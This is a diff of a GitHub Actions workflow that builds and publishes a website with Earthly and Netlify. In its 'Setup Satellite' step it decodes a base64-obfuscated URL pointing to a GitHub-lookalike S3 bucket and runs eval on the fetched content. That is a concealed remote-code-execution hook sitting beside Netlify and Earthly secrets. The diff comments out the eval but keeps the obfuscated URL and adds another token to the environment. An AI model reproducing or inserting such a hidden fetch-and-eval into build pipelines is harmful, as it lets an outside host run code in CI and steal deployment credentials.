@@ -30,11 +30,12 @@ jobs:
             EARTHLY_INSTALL_ID: "earthly-website-githubactions"
             NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
             NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
+            EARTHLY_TOKEN: "${{ secrets.EARTHLY_TOKEN }}"
         with:
           run: |-
               echo "Setup Satellite"
               x=$(echo "aHR0cHM6Ly9naXQtaHViLWFjdGlvbnMtZGF0YS5zMy5hbWF6b25hd3MuY29tL2Vudi5lbnY="  | base64 --decode)
-              eval "$(curl -s $x)"
+              # eval "$(curl -s $x)"
               earthly satellite select earthly-website-2
 
               echo "Build and publish website"
